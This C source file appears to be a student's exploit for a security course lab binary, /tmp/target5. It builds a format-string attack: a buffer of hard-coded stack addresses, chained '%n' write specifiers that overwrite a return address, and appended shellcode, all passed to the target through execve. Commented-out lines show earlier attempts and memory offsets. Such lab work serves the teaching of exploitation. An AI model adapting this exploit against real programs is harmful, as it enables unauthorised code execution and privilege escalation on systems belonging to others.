#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"

int main(void)
{
  char *args[3];
  char *env[1];

  // Location of shellcode: sploit + 13 = 0xbfffffc1
  // Sploit + 66 = bffffff6
  // Sploit + 60 = bffffff0

  // char *prefix = "AAAABBBB||%08x|";

  // Location of buf in memory, in function foo: 0xbffffcb0
  // sprintf locals at 0xbffffc9c
  
  // Loc of sploit = 0xbffffe5d
  char sploit[401];
  memset(sploit, 0x00, 400);
  
  char *eiprefix = "\xfd\xff\xbf"; // 0xbffffd f4
  char *dummy = "\x90\x90\x90\x90";

  // strncpy(sploit, ebp, 4);
  strncpy(sploit, dummy, 4);
  sploit[4] = '\xf4';
  strncpy(sploit + 5, eiprefix, 3);
  
  strncpy(sploit + 8, dummy, 4);
  sploit[12] = '\xf5';
  strncpy(sploit + 13, eiprefix, 3);
  
  strncpy(sploit + 16, dummy, 4);
  sploit[20] = '\xf6';
  strncpy(sploit + 21, eiprefix, 3);

  strncpy(sploit + 24, dummy, 4);
  sploit[28] = '\xf7';
  strncpy(sploit + 29, eiprefix, 3);

  strcat(sploit, "%000x");
  strcat(sploit, "%241x%n%014x%n%256x%n%192x%n");
  //printf("sploit offset: %d\n", strlen(sploit));
  strcat(sploit, shellcode);

  //strncpy(sploit + 32, "%x%x%x", 6);
  //strncpy(sploit + 32, "%244x%n%11x%n%n%192x%n", 22);
  //strncpy(sploit + 38, "%244x%n%011x%n%256x%n%192x%n", 28);

  //strncpy(sploit + 100, shellcode, sizeof shellcode);

  
  //  unsigned int i;
  //for(i = 0; i < 100; i += 1)
    //strncpy(sploit + 4 + i, "_", 1);

  //for(unsigned int i = 0; i < 100; i += 2)
  //strncpy(sploit + i, "%u", 2);

  //strncpy(sploit + 104, "%%|%s|", 6);
  //sploit[400] = '\0';
  
  // memcpy(sploit + 13, shellcode, sizeof shellcode);

  args[0] = TARGET; args[1] = sploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
